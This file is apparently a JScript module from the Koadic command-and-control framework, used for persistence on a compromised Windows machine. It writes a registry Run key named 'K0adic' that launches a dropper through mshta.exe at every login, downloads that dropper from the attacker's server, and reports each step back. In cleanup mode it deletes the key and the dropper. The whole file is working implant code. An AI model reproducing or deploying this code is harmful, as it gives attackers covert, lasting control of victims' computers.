try
{
    var headers = {};
    var path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    var droppath = Koadic.file.getPath("~FDROPDIR~\\~FDROPFILE~");
    var key = "K0adic";

    if (~CLEANUP~)
    {
        headers["Task"] = "DeleteKey";
        var hkey = ~FHKEY~;
        var hkeyname = "";
        switch(hkey)
        {
            case 0x80000001:
                hkeyname = "HKCU";
                break;
            case 0x80000002:
                hkeyname = "HKLM";
                break;
            default:
                break;
        }
        var retval = Koadic.shell.exec("reg delete "+hkeyname+"\\"+path+" /v "+key+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        Koadic.work.report(retval, headers);
        headers["Task"] = "DeleteDropper";
        Koadic.file.deleteFile(droppath);
        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        Koadic.registry.write(~FHKEY~, path, key, "C:\\Windows\\system32\\mshta.exe "+droppath, Koadic.registry.STRING);
        headers["Task"] = "AddKey";
        var retval = Koadic.registry.read(~FHKEY~, path, key, Koadic.registry.STRING).SValue;
        Koadic.work.report(retval, headers);

        headers["X-UploadFileJob"] = "true";
        Koadic.http.downloadEx("POST", Koadic.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }

    Koadic.work.report("Complete");

}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
